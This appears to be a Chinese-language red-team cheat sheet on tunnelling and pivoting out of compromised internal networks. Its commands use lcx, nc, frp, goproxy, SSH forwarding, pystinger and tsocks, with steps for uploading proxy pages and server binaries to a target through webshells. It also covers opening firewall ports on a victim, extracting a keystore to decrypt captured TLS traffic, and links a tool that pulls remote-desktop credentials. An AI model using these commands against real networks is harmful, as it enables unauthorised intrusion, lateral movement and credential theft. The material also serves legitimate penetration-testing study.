https://gitee.com/windyjxx/projects


## 内网穿透
[Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
frp/nps

[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)

-- for xp/2003
3proxy 7.x / CCProxy
nc
[lcx](https://github.com/UndefinedIdentifier/LCX)

[内网渗透中隧道渗透技术](https://blog.csdn.net/qq_17204441/article/details/88834324)
[内网渗透之主机出网OR不出网隧道搭建](https://www.freebuf.com/articles/web/255801.html)
### lcx
```bash
靶机执行
Lcx.exe -slave 192.168.100.3 12345 192.168.100.128 3389 (把攻击机的12346数据 传递给靶机的3389)
攻击机执行
Lcx.exe -listen 12345 12346 (把攻击机12345端口接收到的数据转发到哦12346端口)
```
### nc
[nc端口转发](https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/)
```bash
# 跳板机: 8888 转到 153 的 22端口上
nc -l -p 8888 -c "nc 192.168.19.153 22"
```

自动循环连接
```bash
while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
```

# proxy
## proxychains

只对tcp流量有效，所以udp和icmp都是不能代理转发的。

## frp

frpc
```shell
frpc tcp -s 192.168.50.161:7000 -l 1234 -r 8080
# 相当于
[common]
server_addr = 127.0.0.1
server_port = 7000

[tcp1]
type = tcp
local_ip = 127.0.0.1
local_port = 1234
remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
```
## goproxy

```shell
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
```
## ssh

![](https://s2.loli.net/2022/12/31/vdz5bXjOt368sHW.png)
![](https://s2.loli.net/2022/12/31/OVPkim34YNj5Wwy.png)

1.SSH远程端口转发
```shell
useradd tunneluser -m -d/home/tunneluser -s/bin/true
passwd tunneluser
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N # 跳板机1.1.1.1 将3389 转发到 内网 3.3.3.3:3389
# 攻击者
attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
```

![](https://s2.loli.net/2022/12/31/IAcaVtw671PUevX.jpg)

2.SSH本地端口转发
适用不出网机器, 允许我们从通常无法连接回我们的主机运行反向shell

从attacker-pc转发80并从PC-1使其可用
```shell
PC-1$ ssh tunne1user@1.1.1.1 -L *:80:127.0.0.1:80 -N
PC-1$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

## pystinger 仅web服务权限不出网使用
[Link](https://cloud.tencent.com/developer/article/2036092) 

假设不出网服务器域名为 http://example.com:8080 ,服务器内网IP地址为192.168.3.11

SOCK4代理
```
1. proxy.jsp上传到目标服务器,确保 http://example.com:8080/proxy.jsp 可以访问,页面返回 UTF-8
2. 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行start D:/XXX/stinger_server.exe启动服务端
       不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
3. vps执行./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理
此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020

...

```

## tocks
apt-get install tsocks  
vi /etc/tsocks.conf  

```shell
local = 192.168.1.0/255.255.255.0  #local表示本地的网络，也就是不使用socks代理的网络  
local = 127.0.0.0/255.0.0.0  
server = 127.0.0.1   #socks服务器的IP  
server_type = 5  #socks服务版本  
server_port = 8888  # socks服务使用的端口  
```

run
```shell
tsocks curl http://myexternalip.com &
```

# other

## keystore,keytool,ssl证书解密pcap

```shell
keytool -list -keystore c:\keystore # 输入密钥库口令tomcat
# 从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：tomcatkeystore.p12的证书，命令：
keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat

# 将.p12证书导入Wireshark
# 在Wireshark中打开 .pcap, 菜单: 编辑–首选项–Protocols–SSL，点击右边的Edit：输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat
```

## 向日葵_识别码和验证码提取工具

https://github.com/wafinfo/Sunflower_get_Password

